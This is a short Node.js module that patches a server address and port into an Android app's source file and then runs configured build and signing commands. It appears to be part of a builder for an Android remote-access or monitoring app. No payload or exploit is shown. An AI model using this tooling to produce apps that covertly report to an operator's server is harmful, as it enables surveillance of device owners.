const
    cp = require('child_process'),
    fs = require('fs'),
    CONST = require('./const');

// Thanks -> https://stackoverflow.com/a/19734810/7594368
// This function is a pain in the arse, so many issues because of it! -- hopefully this fix, fixes it!
function javaversion(callback) {
    // Just verify java is callable — any version works with modern apktool
    let spawn = cp.spawn('java', ['-version']);
    let output = '';
    spawn.on('error', (err) => callback('Java not found. Please install Java (any version). Error: ' + err, null));
    spawn.stderr.on('data', (data) => { output += data.toString(); });
    spawn.stdout.on('data', (data) => { output += data.toString(); });
    spawn.on('close', (code) => {
        if (output.length > 0) return callback(null, output.split('\n')[0].trim());
        else return callback('Java not found or not responding', null);
    });
}

function patchAPK(URI, PORT, cb) {
    if (PORT < 65535) {
        fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
            if (err) return cb('File Patch Error - READ')
            var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + URI + ":" + PORT);
            fs.writeFile(CONST.patchFilePath, result, 'utf8', function (err) {
                if (err) return cb('File Patch Error - WRITE')
                else return cb(false)
            });
        });
    }
}

function buildAPK(cb) {
    javaversion(function (err, version) {
        if (!err) cp.exec(CONST.buildCommand, (error, stdout, stderr) => {
            if (error) return cb('Build Command Failed - ' + error.message);
            else cp.exec(CONST.signCommand, (error, stdout, stderr) => {
                if (!error) return cb(false);
                else return cb('Sign Command Failed - ' + error.message);
            });
        });
        else return cb(err);
    })
}

module.exports = {
    buildAPK,
    patchAPK
}
